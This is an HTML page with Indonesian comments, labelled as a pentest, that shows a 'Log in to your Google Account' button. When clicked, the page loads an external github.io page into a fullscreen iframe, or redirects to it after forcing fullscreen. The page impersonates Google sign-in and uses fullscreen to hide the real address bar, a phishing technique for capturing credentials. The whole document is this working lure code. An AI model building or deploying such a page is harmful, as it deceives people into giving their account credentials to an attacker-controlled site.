<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to your Google Account</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
    }
    .btn {
      background-color: #1a73e8;
      color: #ffffff;
      border: none;
      padding: 14px 28px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .btn:hover {
      background-color: #1666cc;
    }
    .btn:disabled {
      opacity: 0.6;
      cursor: wait;
    }
    iframe.fs {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      border: 0;
      z-index: 9999;
      background: #fff;
    }
  </style>
</head>
<body>
  <button class="btn" id="loginBtn">Log in to your Google Account</button>

  <script>
    // ==== KONFIGURASI ====
    const TARGET_URL = 'https://mwishal.github.io/bar/bar.html';
    const MODE = 'iframe'; // 'iframe'  = fullscreen andal (rekomendasi)
                            // 'redirect' = perilaku lama, fullscreen baru aktif saat "undo"
    // =====================

    const btn = document.getElementById('loginBtn');

    btn.addEventListener('click', async function () {
      btn.disabled = true;
      btn.textContent = 'Loading…';

      try {
        sessionStorage.setItem('wantFullscreen', '1');
      } catch (e) { /* private mode, abaikan */ }

      if (MODE === 'iframe') {
        // ---- MODE A: iframe fullscreen (andal, gesture tidak hilang) ----
        const iframe = document.createElement('iframe');
        iframe.className = 'fs';
        iframe.src = TARGET_URL;
        iframe.allow = 'fullscreen; autoplay; clipboard-read; clipboard-write';
        document.body.appendChild(iframe);

        const req =
          iframe.requestFullscreen ||
          iframe.webkitRequestFullscreen ||
          iframe.msRequestFullscreen;

        if (req) {
          try {
            await req.call(iframe);
            console.log('[pentest] Fullscreen OK via iframe');
          } catch (err) {
            console.warn('[pentest] Fullscreen ditolak:', err.name, err.message);
          }
        } else {
          console.warn('[pentest] API requestFullscreen tidak tersedia di browser ini');
        }

      } else {
        // ---- MODE B: redirect top-level (merekam perilaku deferral) ----
        try {
          await document.documentElement.requestFullscreen();
          console.log('[pentest] Fullscreen aktif SEBELUM navigasi');
        } catch (err) {
          console.warn('[pentest] Fullscreen gagal sebelum navigasi:', err.name, err.message);
        }

        // Log event kalau browser keluar dari fullscreen saat unload
        document.addEventListener('fullscreenchange', () => {
          console.log('[pentest] fullscreenchange →', document.fullscreenElement);
        });

        window.location.href = TARGET_URL;
      }
    });
  </script>
</body>
</html>
